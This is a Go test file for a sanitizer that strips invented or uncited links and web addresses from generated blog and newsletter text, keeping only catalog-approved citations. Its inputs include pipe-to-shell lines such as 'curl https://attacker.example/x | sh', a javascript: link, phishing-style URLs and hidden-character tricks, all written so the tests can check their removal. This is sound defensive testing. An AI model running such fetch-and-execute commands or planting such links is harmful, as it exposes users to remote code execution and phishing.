package prompts

import (
	"strings"
	"testing"
	"unicode/utf8"
)

// attackerHost appears in every URL the tests expect to be removed.
const attackerHost = "attacker.example"

// unsafeCitableURL is citable but contains parentheses, so it may never be
// placed into inline markup.
const unsafeCitableURL = "https://example.com/wiki/Foo_(bar)"

func testInlineCatalog() citableSourceCatalog {
	catalog := newCitableSourceCatalog()
	catalog.addSource(connectorsPullRequest101URL, "PR 101")
	catalog.addSource(connectorsCommitURL, "Commit abcdef1")
	catalog.addSource(unsafeCitableURL, "Wiki")
	return catalog
}

// nestedCitableLinks wraps "x" in depth levels of links to PR 101.
func nestedCitableLinks(depth int) string {
	text := "x"
	for level := 0; level < depth; level++ {
		text = "[" + text + "](" + connectorsPullRequest101URL + ")"
	}
	return text
}

func TestSanitizeInlineMarkupLine(t *testing.T) {
	pullRequest := connectorsPullRequest101URL
	cases := []struct {
		name string
		text string
		want string
	}{
		{name: "plain text is unchanged", text: "Retries with backoff (up to 5 times).", want: "Retries with backoff (up to 5 times)."},
		{name: "citable link is kept", text: "See [PR 101](" + pullRequest + ").", want: "See [PR 101](" + pullRequest + ")."},
		{name: "citable link is rewritten to the canonical spelling", text: "See [PR 101](" + strings.ToUpper(pullRequest) + "/).", want: "See [PR 101](" + pullRequest + ")."},
		{name: "invented link is reduced to its label", text: "See [design doc](https://attacker.example/phish) now.", want: "See design doc now."},
		{name: "invented link on a citable host is reduced", text: "[PR 999](" + inventedURL + ")", want: "PR 999"},
		{name: "script link is reduced", text: "[click](javascript:alert(1))", want: "click"},
		{name: "relative link is reduced", text: "[docs](docs/readme.md)", want: "docs"},
		{name: "blank-label invented link disappears", text: "a [](https://attacker.example/) b", want: "a b"},
		{name: "blank-label citable link is kept", text: "a [](" + pullRequest + ") b", want: "a [](" + pullRequest + ") b"},
		{name: "citable URL that is unsafe in markup is reduced", text: "[Foo](" + unsafeCitableURL + ")", want: "Foo"},
		{name: "several links are handled in one pass", text: "[a](https://attacker.example/1) and [b](" + pullRequest + ")", want: "a and [b](" + pullRequest + ")"},
		{name: "bare invented URL is removed", text: "see https://attacker.example/phish for details", want: "see for details"},
		{name: "bare URL scheme is matched case-insensitively", text: "see HTTPS://ATTACKER.EXAMPLE/x.", want: "see ."},
		{name: "bare URL inside a word is removed", text: "xhttps://attacker.example/y z", want: "x z"},
		{name: "bare non-ASCII URL is removed", text: "see https://exämple.com/ä now", want: "see now"},
		{name: "bare citable URL is kept with trailing punctuation", text: "Merged in " + pullRequest + ".", want: "Merged in " + pullRequest + "."},
		{name: "bare citable URL is canonicalized", text: "Merged in " + strings.ToUpper(pullRequest) + "/, then", want: "Merged in " + pullRequest + ", then"},
		{name: "bare URL below a citable URL is removed", text: "Files: " + pullRequest + "/files", want: "Files:"},
		{name: "a scheme without a host is text", text: "URLs starting with https:// are rejected", want: "URLs starting with https:// are rejected"},
		{name: "code spans are kept verbatim", text: "Use `[x](https://attacker.example)` or `https://attacker.example`.", want: "Use `[x](https://attacker.example)` or `https://attacker.example`."},
		{name: "a code span inside a label cannot hide the closing bracket", text: "[x `]` ](https://attacker.example/e)", want: "x `]`"},
		{name: "an unclosed backtick is literal", text: "a ` [b](https://attacker.example/q)", want: "a ` b"},
		{name: "invented link nested in a citable link is removed", text: "[[x](https://attacker.example/a)](" + pullRequest + ")", want: "x"},
		{name: "invented link nested in an invented link is removed", text: "[[x](https://attacker.example/b)](https://unlisted.example/)", want: "x"},
		{name: "citable link whose label is a URL is reduced", text: "[https://attacker.example/k](" + pullRequest + ")", want: ""},
		{name: "link exposed by removing a bare URL is checked", text: "[p]https://attacker.example(https://attacker.example/z)", want: "p"},
		{name: "overlong destination exposes the inner link", text: "[[a](https://attacker.example/i)](https://x.example/" + strings.Repeat("a", 2100) + ")", want: "a"},
		{name: "zero-width space between bracket and parenthesis", text: "[a]" + string(rune(0x200B)) + "(https://attacker.example/f)", want: "a"},
		{name: "bidi override between bracket and parenthesis", text: "[a]" + string(rune(0x202E)) + "(https://attacker.example/g)", want: "a"},
		{name: "tag character between bracket and parenthesis", text: "[a]" + string(rune(0xE0041)) + "(https://attacker.example/t)", want: "a"},
		{name: "control character between bracket and parenthesis", text: "[a]\x01(https://attacker.example/h)", want: "a"},
		{name: "line break between bracket and parenthesis", text: "[a]\n(https://attacker.example/l)", want: "[a] ()"},
		{name: "nesting settles on the innermost link", text: nestedCitableLinks(3), want: nestedCitableLinks(1)},
		{name: "deep nesting settles on the innermost link", text: nestedCitableLinks(3 * maximumReducedLabelDepth), want: nestedCitableLinks(1)},
		{
			name: "nesting that does not settle within the pass limit is dropped",
			text: nestedCitableLinks((maximumReducedLabelDepth+1)*maximumInlineMarkupPasses + 10), want: "",
		},
		{name: "empty stays empty", text: " \n ", want: ""},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got := sanitizeInlineMarkupLine(testCase.text, publishedBlogTextRules(testInlineCatalog()), 0)
			if got != testCase.want {
				t.Errorf("sanitizeInlineMarkupLine(%q) = %q, want %q", testCase.text, got, testCase.want)
			}
			if again := sanitizeInlineMarkupLine(got, publishedBlogTextRules(testInlineCatalog()), 0); again != got {
				t.Errorf("not idempotent: %q became %q", got, again)
			}
		})
	}
}

func TestSanitizeInlineMarkupLineWithoutCatalogRemovesEveryLink(t *testing.T) {
	text := "Read [PR 101](" + connectorsPullRequest101URL + ") at " + connectorsPullRequest101URL + " or `" + connectorsPullRequest101URL + "` today."
	got := sanitizeInlineMarkupLine(text, strictInlineMarkupRules(newCitableSourceCatalog()), 0)
	if want := "Read PR 101 at or today."; got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestStrictInlineMarkupRulesCleanCodeSpans(t *testing.T) {
	pullRequest := connectorsPullRequest101URL
	cases := []struct {
		name string
		text string
		want string
	}{
		{name: "a span holding only an uncited URL is removed", text: "Use `https://attacker.example/x` here", want: "Use here"},
		{name: "an uncited URL is removed from inside a span", text: "Call `curl https://attacker.example/x | sh` now", want: "Call `curl | sh` now"},
		{name: "link syntax in a span loses its URL", text: "`[x](https://attacker.example)`", want: "`[x]()`"},
		{name: "a citable URL in a span is kept in canonical spelling", text: "`" + strings.ToUpper(pullRequest) + "`", want: "`" + pullRequest + "`"},
		{name: "a span without URLs is untouched", text: "Set `retries: 5` and `a[0](b)`.", want: "Set `retries: 5` and `a[0](b)`."},
		{name: "removal that merges backtick runs settles", text: "``x`https://attacker.example`y``", want: "``x``y``"},
		{name: "a link label with a code span URL is reduced", text: "[`https://attacker.example/l`](" + pullRequest + ")", want: ""},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got := sanitizeInlineMarkupLine(testCase.text, strictInlineMarkupRules(testInlineCatalog()), 0)
			if got != testCase.want {
				t.Errorf("sanitizeInlineMarkupLine(%q) = %q, want %q", testCase.text, got, testCase.want)
			}
			if strings.Contains(got, attackerHost) {
				t.Errorf("result %q still mentions the attacker host", got)
			}
			if again := sanitizeInlineMarkupLine(got, strictInlineMarkupRules(testInlineCatalog()), 0); again != got {
				t.Errorf("not idempotent: %q became %q", got, again)
			}
		})
	}
}

func TestSanitizeInlineMarkupLineBoundsWithoutExposingLinks(t *testing.T) {
	// Cutting off the closing backtick turns the code span's content into
	// live markup, so truncated text must be sanitized again.
	text := "`[y](https://attacker.example/q) " + strings.Repeat("z", 10) + "`"
	maximum := utf8.RuneCountInString(text) - 1
	got := sanitizeInlineMarkupLine(text, publishedBlogTextRules(testInlineCatalog()), maximum)
	if strings.Contains(got, attackerHost) || utf8.RuneCountInString(got) > maximum {
		t.Errorf("sanitizeInlineMarkupLine(%q, %d) = %q", text, maximum, got)
	}
	for _, maximum := range []int{1, 5, 12, 30} {
		long := "See [PR 101](" + connectorsPullRequest101URL + ") and https://attacker.example/x for more"
		got := sanitizeInlineMarkupLine(long, publishedBlogTextRules(testInlineCatalog()), maximum)
		if strings.Contains(got, attackerHost) || utf8.RuneCountInString(got) > maximum {
			t.Errorf("maximum %d: got %q", maximum, got)
		}
	}
}

func TestSanitizeInlineMarkupProse(t *testing.T) {
	pullRequest := connectorsPullRequest101URL
	cases := []struct {
		name string
		text string
		want string
	}{
		{name: "paragraphs and line breaks are normalized", text: "  First line \nsecond line\n\n\n \nNext paragraph\n", want: "First line\nsecond line\n\nNext paragraph"},
		{name: "CR, CRLF, and line separators become LF", text: "a\r\nb\rc" + string(rune(0x2028)) + "d", want: "a\nb\nc\nd"},
		{name: "hidden characters are dropped", text: "a" + string(rune(0x200B)) + "b" + string(rune(0xE0041)) + "c\x01d", want: "abcd"},
		{name: "citable link is kept", text: "See [PR](" + pullRequest + ").\n\nMore.", want: "See [PR](" + pullRequest + ").\n\nMore."},
		{name: "invented link is reduced", text: "See [docs](https://attacker.example/x).", want: "See docs."},
		{name: "a code span cannot span paragraphs", text: "`\n\n[y](https://attacker.example/c)`", want: "`\n\ny`"},
		{name: "a whitespace-only line separates paragraphs", text: "`\n \t \n[y](https://attacker.example/d)`", want: "`\n\ny`"},
		{name: "a code span may span lines within a paragraph", text: "`a\n[y](https://attacker.example/e)`", want: "`a\n[y](https://attacker.example/e)`"},
		{name: "reducing a link can split a paragraph", text: "[a\n](https://attacker.example/f)\nb", want: "a\n\nb"},
		{name: "bare URL is removed from each paragraph", text: "one https://attacker.example/1\n\ntwo https://attacker.example/2 end", want: "one\n\ntwo  end"},
		{name: "empty stays empty", text: "\n \n", want: ""},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got := sanitizeInlineMarkupProse(testCase.text, publishedBlogTextRules(testInlineCatalog()))
			if got != testCase.want {
				t.Errorf("sanitizeInlineMarkupProse(%q) = %q, want %q", testCase.text, got, testCase.want)
			}
			if again := sanitizeInlineMarkupProse(got, publishedBlogTextRules(testInlineCatalog())); again != got {
				t.Errorf("not idempotent: %q became %q", got, again)
			}
			if again := normalizeProse(got); again != got {
				t.Errorf("output is not normalized: %q became %q", got, again)
			}
		})
	}
}

// bothInlineRules runs a check under the strict and the published-blog-text
// rules, which treat text outside code spans identically.
func bothInlineRules() map[string]inlineMarkupRules {
	return map[string]inlineMarkupRules{
		"strict":    strictInlineMarkupRules(testInlineCatalog()),
		"published": publishedBlogTextRules(testInlineCatalog()),
	}
}

func TestSchemelessWebAddressesAreRemovedUnlessCitable(t *testing.T) {
	pullRequest := connectorsPullRequest101URL
	schemelessPullRequest := strings.TrimPrefix(pullRequest, "https://")
	cases := []struct {
		name string
		text string
		want string
	}{
		{name: "www host with a path", text: "Log in at www.attacker.example/login now", want: "Log in at now"},
		{name: "www host without a path", text: "Visit www.attacker.example today", want: "Visit today"},
		{name: "shouted www host", text: "Visit WWW.ATTACKER.EXAMPLE/LOGIN.", want: "Visit ."},
		{name: "host with a path", text: "Log in at attacker.example/path.", want: "Log in at ."},
		{name: "host with a root path", text: "Go to attacker.example/ first", want: "Go to first"},
		{name: "host with a port and a path", text: "Use attacker.example:8443/login", want: "Use"},
		{name: "subdomain with query and fragment", text: "a login.attacker.example/a?b=c#d b", want: "a b"},
		{name: "real top-level domain", text: "Reset at evil.com/reset", want: "Reset at"},
		{name: "top-level domain that is also a file extension", text: "Run evil.sh/install", want: "Run"},
		{name: "internationalized host", text: "See bücher.example/x now", want: "See now"},
		{name: "punycode host", text: "See xn--bcher-kva.example/x now", want: "See now"},
		{name: "punycode top-level domain", text: "See attacker.xn--p1ai/x now", want: "See now"},
		{name: "after a non-http scheme", text: "Get ftp://attacker.example/x now", want: "Get ftp:// now"},
		{name: "after an at sign", text: "Ping user@attacker.example/x now", want: "Ping user@ now"},
		{name: "after a slash", text: "Read docs/attacker.example/x now", want: "Read docs/ now"},
		{name: "after dots", text: "Wait..attacker.example/login", want: "Wait.."},
		{name: "after an underscore", text: "a_attacker.example/x b", want: "a_ b"},
		{name: "inside quotes", text: `Open "attacker.example/x" now`, want: `Open "" now`},
		{name: "after a file name alternative", text: "Node.js/attacker.example/login", want: "Node.js/"},
		{name: "www host inside a word", text: "Try awww.attacker.example now", want: "Try a now"},
		{name: "www host after a subdomain", text: "Try login.www.attacker.example now", want: "Try login. now"},
		{name: "host with a path inside a word", text: "Try xattacker.example/login now", want: "Try now"},
		{name: "invented link to a scheme-less address", text: "[docs](www.attacker.example/x)", want: "docs"},
		{name: "citable link whose label is a www host", text: "[www.attacker.example](" + pullRequest + ")", want: ""},
		{name: "citable link whose label is a host with a path", text: "[see attacker.example/l](" + pullRequest + ")", want: "see"},
		{name: "reducing a link that forms an address", text: "[attacker](https://x.example/q).example/login", want: ""},
		{name: "citable address is rewritten to the canonical URL", text: "Merged in " + schemelessPullRequest + ".", want: "Merged in " + pullRequest + "."},
		{name: "citable address matches ignoring case and trailing slash", text: "See " + strings.ToUpper(schemelessPullRequest) + "/ now", want: "See " + pullRequest + " now"},
		{name: "citable host with another path is removed", text: "See github.com/superdurable/dex-connectors-library/pull/999 now", want: "See now"},
		{name: "citable path with a query is removed", text: "See " + schemelessPullRequest + "?tab=files now", want: "See now"},
		{name: "citable path on another host is removed", text: "See www." + schemelessPullRequest + " now", want: "See now"},
		{name: "citable path below a citable URL is removed", text: "See " + schemelessPullRequest + "/files now", want: "See now"},
	}
	for rulesName, rules := range bothInlineRules() {
		for _, testCase := range cases {
			t.Run(rulesName+"/"+testCase.name, func(t *testing.T) {
				got := sanitizeInlineMarkupLine(testCase.text, rules, 0)
				if got != testCase.want {
					t.Errorf("sanitizeInlineMarkupLine(%q) = %q, want %q", testCase.text, got, testCase.want)
				}
				if strings.Contains(strings.ToLower(got), attackerHost) {
					t.Errorf("result %q still mentions the attacker host", got)
				}
				if again := sanitizeInlineMarkupLine(got, rules, 0); again != got {
					t.Errorf("not idempotent: %q became %q", got, again)
				}
			})
		}
	}
}

func TestSchemelessWebAddressDetectionLeavesOrdinaryTextAlone(t *testing.T) {
	texts := []string{
		"Released v1.2.3 today, and v1.2.4/v1.3.0 follow.",
		"Edit client.go and README.md, then update go.mod/go.sum.",
		"Works with Node.js/Deno, package.json/tsconfig.json, and values.yaml/values.yml.",
		"See internal/techblog/model and sdk-go/client.go for details.",
		"The remote is git@github.com:superdurable/dex.git and dex.git/config.",
		"Use e.g./i.e. carefully in U.S./EU copy.",
		"HTTP/1.1 and TCP/IP run 24/7, and/or I/O.",
		"Versions 2.0/3.0 and the 10.0.0.1/24 range.",
		"Email bob@example.com or visit example.com without a path.",
		"The WWW. The www is fun. www.",
		"Throughput rose 2.5x/3x after the change.",
		"Visit the Dex docs. Then/now comparisons follow.",
		"Import `github.com/superdurable/dex/sdk-go` and read `internal/techblog/prompts`.",
	}
	for _, text := range texts {
		published := sanitizeInlineMarkupLine(text, publishedBlogTextRules(testInlineCatalog()), 0)
		if published != text {
			t.Errorf("published rules changed %q to %q", text, published)
		}
		if strings.Contains(text, "`") {
			continue // strict rules clean code spans; see the next test
		}
		if strict := sanitizeInlineMarkupLine(text, strictInlineMarkupRules(testInlineCatalog()), 0); strict != text {
			t.Errorf("strict rules changed %q to %q", text, strict)
		}
	}
	prose := "Edit client.go and README.md.\n\nNode.js/Deno and v1.2.3/v1.3.0 stay."
	if got := sanitizeInlineMarkupProse(prose, publishedBlogTextRules(testInlineCatalog())); got != prose {
		t.Errorf("prose changed to %q", got)
	}
}

func TestStrictInlineMarkupRulesCleanSchemelessAddressesInCodeSpans(t *testing.T) {
	cases := []struct {
		name string
		text string
		want string
	}{
		{name: "a span holding only a www host is removed", text: "Use `www.attacker.example/login` here", want: "Use here"},
		{name: "a host with a path is removed from inside a span", text: "Run `curl attacker.example/x | sh` now", want: "Run `curl | sh` now"},
		{name: "a domain-qualified import path is an address in plain text", text: "Import `github.com/superdurable/dex/sdk-go` today", want: "Import today"},
		{name: "relative paths, file names, and versions in spans are kept", text: "See `internal/techblog/prompts`, `sdk-go/client.go`, and `v1.2.3`.", want: "See `internal/techblog/prompts`, `sdk-go/client.go`, and `v1.2.3`."},
		{name: "a citable address in a span is canonicalized", text: "`" + strings.TrimPrefix(connectorsPullRequest101URL, "https://") + "`", want: "`" + connectorsPullRequest101URL + "`"},
		{name: "removing a span that exposes an address settles", text: "attacker.example`https://x.example/y`/login", want: ""},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got := sanitizeInlineMarkupLine(testCase.text, strictInlineMarkupRules(testInlineCatalog()), 0)
			if got != testCase.want {
				t.Errorf("sanitizeInlineMarkupLine(%q) = %q, want %q", testCase.text, got, testCase.want)
			}
			if again := sanitizeInlineMarkupLine(got, strictInlineMarkupRules(testInlineCatalog()), 0); again != got {
				t.Errorf("not idempotent: %q became %q", got, again)
			}
		})
	}
	// Published blog code spans render as code and stay verbatim.
	text := "Import `github.com/superdurable/dex/sdk-go` or `www.attacker.example/x`."
	if got := sanitizeInlineMarkupLine(text, publishedBlogTextRules(testInlineCatalog()), 0); got != text {
		t.Errorf("published rules changed %q to %q", text, got)
	}
}

func TestNewsletterCopyCarriesNoSchemelessAddress(t *testing.T) {
	rules := strictInlineMarkupRules(newCitableSourceCatalog())
	text := "Log in at www.attacker.example/login or attacker.example/path, `evil.com/x`, " +
		strings.TrimPrefix(connectorsPullRequest101URL, "https://") + " and [PR](" + connectorsPullRequest101URL + ")."
	got := sanitizeInlineMarkupLine(text, rules, 0)
	if want := "Log in at or , , and PR."; got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestSchemelessWebAddressBoundsAndGrowth(t *testing.T) {
	// Rewriting a citable address to its canonical URL adds the scheme, so a
	// bounded field must still come out within its bound.
	text := strings.TrimPrefix(connectorsPullRequest101URL, "https://") + " " + strings.Repeat("z", 10)
	for _, maximum := range []int{utf8.RuneCountInString(text), 20, 5} {
		got := sanitizeInlineMarkupLine(text, strictInlineMarkupRules(testInlineCatalog()), maximum)
		if utf8.RuneCountInString(got) > maximum {
			t.Errorf("maximum %d: got %q", maximum, got)
		}
	}
	// A long run of dotted labels that never forms an address is scanned in
	// linear time (a rescan from every label would take minutes) and left
	// alone.
	long := strings.Repeat("a.", 100000) + "b/c"
	if got := sanitizeInlineMarkupLine(long, strictInlineMarkupRules(testInlineCatalog()), 0); got != long {
		t.Errorf("long dotted text changed (length %d -> %d)", len(long), len(got))
	}
}

func TestSchemelessWebAddressLength(t *testing.T) {
	cases := []struct {
		text     string
		want     int
		wantHost int
	}{
		{text: "www.a.example/x y", want: len("www.a.example/x"), wantHost: len("www.a.example")},
		{text: "WwW.a b", want: len("WwW.a"), wantHost: len("WwW.a")},
		{text: "www.a.example.", want: len("www.a.example"), wantHost: len("www.a.example")},
		{text: "a.example/x),", want: len("a.example/x"), wantHost: len("a.example")},
		{text: "a.example:80/x", want: len("a.example:80/x"), wantHost: len("a.example")},
		{text: "a.example:/x", want: 0, wantHost: len("a.example")},
		{text: "a.example", want: 0, wantHost: len("a.example")},
		{text: "a.example?x", want: 0, wantHost: len("a.example")},
		{text: "client.go/x", want: 0, wantHost: len("client.go")},
		{text: "v1.2.3/x", want: 0, wantHost: len("v1.2.3")},
		{text: "e.g/x", want: 0, wantHost: len("e.g")},
		{text: "www", want: 0, wantHost: len("www")},
		{text: "www. x", want: 0, wantHost: len("www")},
		{text: "a..example/x", want: 0, wantHost: len("a")},
		{text: ".example/x", want: 0, wantHost: 0},
		{text: "", want: 0, wantHost: 0},
	}
	for _, testCase := range cases {
		got, host := schemelessWebAddressLength(testCase.text)
		if got != testCase.want || host != testCase.wantHost {
			t.Errorf("schemelessWebAddressLength(%q) = %d, %d, want %d, %d", testCase.text, got, host, testCase.want, testCase.wantHost)
		}
	}
}

func TestCitableAddressKeyComparesHostAndPath(t *testing.T) {
	catalog := testInlineCatalog()
	for _, address := range []string{
		"github.com/superdurable/dex-connectors-library/pull/101",
		"GITHUB.COM/superdurable/dex-connectors-library/pull/101/",
	} {
		if canonicalURL, found := catalog.resolveAddress(address); !found || canonicalURL != connectorsPullRequest101URL {
			t.Errorf("resolveAddress(%q) = %q, %v", address, canonicalURL, found)
		}
	}
	for _, address := range []string{
		"github.com/superdurable/dex-connectors-library/pull/10",
		"github.com/superdurable/dex-connectors-library/pull/101/files",
		"github.com:443/superdurable/dex-connectors-library/pull/101",
		"www.github.com/superdurable/dex-connectors-library/pull/101",
		"https://github.com/superdurable/dex-connectors-library/pull/101x",
	} {
		if canonicalURL, found := catalog.resolveAddress(address); found {
			t.Errorf("resolveAddress(%q) = %q, want not found", address, canonicalURL)
		}
	}
}

func TestBareURLLength(t *testing.T) {
	cases := []struct {
		text string
		want int
	}{
		{text: "https://a.example/x y", want: len("https://a.example/x")},
		{text: "http://a.example", want: len("http://a.example")},
		{text: "HtTpS://a.example.", want: len("HtTpS://a.example")},
		{text: "https://a.example/x),", want: len("https://a.example/x")},
		{text: "https://a.example/[x]", want: len("https://a.example/")},
		{text: "https://a.example/`x`", want: len("https://a.example/")},
		{text: "https://a.example/…", want: len("https://a.example/")},
		{text: "https://", want: 0},
		{text: "https:// x", want: 0},
		{text: "https://.", want: 0},
		{text: "ftp://a.example", want: 0},
		{text: "httpx://a.example", want: 0},
		{text: "http:/a.example", want: 0},
		{text: "", want: 0},
	}
	for _, testCase := range cases {
		if got := bareURLLength(testCase.text); got != testCase.want {
			t.Errorf("bareURLLength(%q) = %d, want %d", testCase.text, got, testCase.want)
		}
	}
}
